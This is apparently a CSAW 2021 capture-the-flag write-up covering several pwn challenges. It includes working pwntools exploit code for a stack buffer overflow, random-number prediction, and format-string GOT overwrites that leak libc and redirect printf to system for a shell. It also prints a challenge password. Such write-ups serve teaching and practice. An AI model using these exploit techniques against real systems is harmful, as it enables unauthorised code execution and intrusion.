Table of Contents
=================

   * [Alien math](#alien-math)
   * [haySTACK](#haystack)
   * [procrastination-simulator](#procrastination-simulator)
      * [file_4](#file_4)
      * [file_2](#file_2)
      * [file_1](#file_1)
   * [Cold](#cold)
   * [word_games](#word_games)

Sorry for my bad english !!
## Alien math
```
Alien Math
60
Brush off your Flirbgarple textbooks!

nc pwn.chal.csaw.io 5004
```
![image](https://user-images.githubusercontent.com/87422359/133059630-36a26841-4747-4ec2-8b66-33a8b6ca0365.png)
![image](https://user-images.githubusercontent.com/87422359/133059840-163d6577-05db-47ce-af83-eb8601f5fc55.png)
![image](https://user-images.githubusercontent.com/87422359/133060090-14b3f5c4-76ad-46f0-9c3c-9235d4531789.png)
there are a BoF bug and a function give us the flag, just return to it.
<br />
payload:
<br />
```python
print_flag = 0x4014FB
r.sendlineafter("salwzoblrs", 'a'*0x18 + p64(print_flag))
```
## haySTACK
![image](https://user-images.githubusercontent.com/87422359/133061463-df45127b-c6df-4a61-9bc8-19277783455a.png)
```c
unsigned __int64 __fastcall sub_1273(__int64 a1)
{
  int i; // [rsp+14h] [rbp-3Ch]
  int v3; // [rsp+18h] [rbp-38h]
  int v4; // [rsp+1Ch] [rbp-34h]
  char s[8]; // [rsp+20h] [rbp-30h] BYREF
  __int64 v6; // [rsp+28h] [rbp-28h]
  __int64 v7; // [rsp+30h] [rbp-20h]
  __int64 v8; // [rsp+38h] [rbp-18h]
  unsigned __int64 v9; // [rsp+48h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  v3 = random();
  *(4LL * v3 + a1) = 4919;
  *s = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  for ( i = 0; i <= 2; ++i )
  {
    fwrite("Which haystack do you want to check?\n", 1uLL, 0x25uLL, stdout);
    fgets(s, 32, stdin);
    v4 = atoi(s);
    if ( v4 <= 0x100000 )
    {
      if ( v4 == v3 )
      {
        printf("Hey you found a needle! And its number is 0x%08x! That's it!\n", *(4LL * v4 + a1));
        win();
      }
      else
      {
        printf("Hey, you found a needle, but it's number is 0x%08x. I don't like that one\n", *(4LL * v4 + a1));
        if ( i )
        {
          if ( i == 1 )
            puts("Did I mention I'm in a hurry? I need you to find it on your next guess");
        }
        else
        {
          puts("Shoot, I forgot to tell you that I hid a needle in every stack. But I only have one favorite needle");
        }
      }
    }
    else
    {
      fwrite("I don't have that many haystacks!\n", 1uLL, 0x22uLL, stdout);
    }
    if ( i == 2 )
    {
      puts("I'm out of time. Thanks for trying...");
      return v9 - __readfsqword(0x28u);
    }
    puts("Let's try again!");
  }
  return v9 - __readfsqword(0x28u);
}
```
we will get flag if our input equal to the random number `v3`
<br />
payload:
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(int argc,char** argv) {
	int result;
	srand(time(NULL) + 2);
	result = rand() % 0x100000;
	printf("%d\n", result);
}
```
```python
process = subprocess.Popen('./a.out', stdout=subprocess.PIPE)
rd = process.stdout.readline().rstrip()
r.sendline(rd)
```
## procrastination-simulator
```
procrastination-simulator
point: 430
Oh noes! I partied all weekend and now it's an hour before the CTF ends and I have school deadlines tonight too. Can you help me write 60 reports and pwn 50 challenges by Sunday afternoon? nc auto-pwn.chal.csaw.io 11001 with password cd80d3cd8a479a18bbc9652f3631c61c
```
`nc auto-pwn.chal.csaw.io 11001` then enter the password, we get 
the binary like this:
![given_binary](https://user-images.githubusercontent.com/87422359/133044852-ecc1638d-c82f-4e11-8d92-853e5ead68f6.png)
<br />
we write it to a file then convert it to binary by `xxd -r`<br />
When we pwned and got shell, there was a message on the server give
us another address, port, password and there is another binary on that server. <br />
there are 3 levels, we need a different payload when we up to next level, we 
need to pwn all them to get the flag.
<br />
### file_4
![image](https://user-images.githubusercontent.com/87422359/133046641-66cd8285-9bfe-43e3-b136-dd8d0048f8c0.png)
<br />
![image](https://user-images.githubusercontent.com/87422359/133046725-49740c3c-6793-4e24-b3c3-e9ff5ca6392c.png)
<br />
![image](https://user-images.githubusercontent.com/87422359/133046834-aa56ed9a-f9d8-405b-8413-418d22211268.png)
<br />
there are a fsb, and function to get shell.
<br />
what we need to do is overwrite `win()`'s address to `put's got`.
<br />
payload:
<br />
```python
payload  = 'aa'
payload += p32(e.got["exit"])
payload += '%' + str((e.sym['win'] & 0xffff) - 6) + 'd%6$hn'
## send password
r.sendlineafter("password", "cd80d3cd8a479a18bbc9652f3631c61c")
r.sendlineafter('generate a report', payload)
```
![image](https://user-images.githubusercontent.com/87422359/133050190-6ddfbe51-010a-45f7-9050-3f643c7d9c16.png)
### file_2
![image](https://user-images.githubusercontent.com/87422359/133050630-44a7fde5-2f7e-4564-aa28-1c4c01472dd4.png)
<br />
we still have fsb but there is no win function this time.
<br />
![image](https://user-images.githubusercontent.com/87422359/133051357-b5211b7d-7eea-44a1-b9e1-7767891d97c8.png)
<br />
but there is a `/bin/sh` in the binary so i decide to dig into the binary
and i got this
<br />
![image](https://user-images.githubusercontent.com/87422359/133052191-8987d866-8f9f-48fe-84b0-45d96c346765.png)
<br />
same way, but `0x401534` insteal of `win()`'s address.
### file_1
![image](https://user-images.githubusercontent.com/87422359/133052449-5108e99f-145f-4eb2-9523-4c3c1c2b351a.png)
<br />
this time we got 3 times fsb but `PIE enable`, what we
need to do is leak `libc base`, leak `code base` then overwrite `system`'s address
to `printf got`, then enter `/bin/sh`, programe will run `printf('/bin/sh')`
but printf is overwritten so we get `system('/bin/sh')`
<br />
payload:
<br />
```python
## stage 1
payload  = ''
payload += '%45$p %7$p'
p.sendlineafter('> ', payload)

## leaking
p.recvuntil("ntents of Report 1:\n")
leak = int(p.recvuntil(' ').strip(), 16)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
log.info("leak :%s:" % hex(leak))
libc.sym['win'] = one[0]
libc.address = leak - 0x0270b3
log.info("base :%s:" % hex(libc.address))
log.info("win :%s:" % hex(libc.sym['win']))
leak1 = int(p.recvline().strip(), 16) - 156
log.info("target :%s:" % hex(leak1))

## stage 2
payload  = ''
payload += '%' + str(libc.sym["system"] >> 16 & 0xff) + 'd%13$hhn'
payload += '%' + str((libc.sym["system"] & 0xffff) - (libc.sym["system"] >> 16 & 0xff)) + 'd%12$hn'
payload  = payload.ljust(32,'a')
payload += p64(leak1)
payload += p64(leak1 + 2)
p.sendlineafter('s batch!!', payload)

## stage 3
payload  = '/bin/sh'
sleep(1)
p.sendline(payload)
```
## Cold
## word_games
